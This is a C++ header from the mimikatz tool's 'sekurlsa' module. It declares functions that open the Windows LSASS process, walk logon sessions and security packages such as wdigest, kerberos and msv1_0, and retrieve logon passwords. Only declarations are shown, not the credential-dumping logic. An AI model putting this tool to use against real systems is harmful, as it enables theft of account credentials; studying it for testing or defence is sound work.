/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by/3.0/fr/
*/
#pragma once
#include "globdefs.h"
#include "mod_memory.h"
#include "mod_process.h"
#include "mod_text.h"
#include "mod_system.h"
#include <iostream>
#include "secpkg.h"

#include "LSA Keys/keys_nt5.h"
#include "LSA Keys/keys_nt6.h"

#include "Security Packages/msv1_0.h"
#include "Security Packages/tspkg.h"
#include "Security Packages/wdigest.h"
#include "Security Packages/kerberos.h"
#include "Security Packages/livessp.h"
#include "Security Packages/ssp.h"

class mod_mimikatz_sekurlsa
{
public:
	typedef bool (WINAPI * PFN_ENUM_BY_LUID) (__in PLUID logId, __in bool justSecurity);
private:
	typedef struct _KIWI_MODULE_PKG_LSA {
		wchar_t *	moduleName;
		wchar_t *	simpleName;
		PFN_ENUM_BY_LUID	enumFunc;
		mod_process::PKIWI_VERY_BASIC_MODULEENTRY * pModuleEntry;
		_KIWI_MODULE_PKG_LSA(wchar_t * leModuleName, wchar_t * leSimpleName, PFN_ENUM_BY_LUID laEnumFunc, mod_process::PKIWI_VERY_BASIC_MODULEENTRY * pLeModuleEntry) : moduleName(leModuleName), simpleName(leSimpleName), enumFunc(laEnumFunc), pModuleEntry(pLeModuleEntry) {}
	} KIWI_MODULE_PKG_LSA, *PKIWI_MODULE_PKG_LSA;

	static bool lsassOK;
	static vector<pair<PFN_ENUM_BY_LUID, wstring>> GLOB_ALL_Providers;
	static vector<KIWI_MODULE_PKG_LSA> mesModules;

	static PVOID getPtrFromAVLByLuidRec(PRTL_AVL_TABLE pTable, unsigned long LUIDoffset, PLUID luidToFind);
	static bool ressembleString(PUNICODE_STRING maChaine, wstring * dstChaine = NULL, BYTE **buffer = NULL);

	static bool getLogonPasswords(vector<wstring> * arguments);
	static bool searchPasswords(vector<wstring> * arguments);
public:
	static HANDLE hLSASS;
	static HMODULE hLsaSrv;
	static mod_process::KIWI_VERY_BASIC_MODULEENTRY localLSASRV, *pModLSASRV;
	static PLSA_SECPKG_FUNCTION_TABLE SeckPkgFunctionTable;

	static PLIST_ENTRY getPtrFromLinkedListByLuid(PLIST_ENTRY pSecurityStruct, unsigned long LUIDoffset, PLUID luidToFind);
	static PVOID getPtrFromAVLByLuid(PRTL_AVL_TABLE pTable, unsigned long LUIDoffset, PLUID luidToFind);

	static void genericCredsToStream(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds, bool justSecurity, bool isDomainFirst = false, PDWORD pos = NULL);
	static bool	getLogonData(vector<wstring> * mesArguments, vector<pair<PFN_ENUM_BY_LUID, wstring>> * mesProviders);

	static bool loadLsaSrv();
	static bool unloadLsaSrv();
	static bool searchLSASSDatas();

	static vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> getMimiKatzCommands();
};
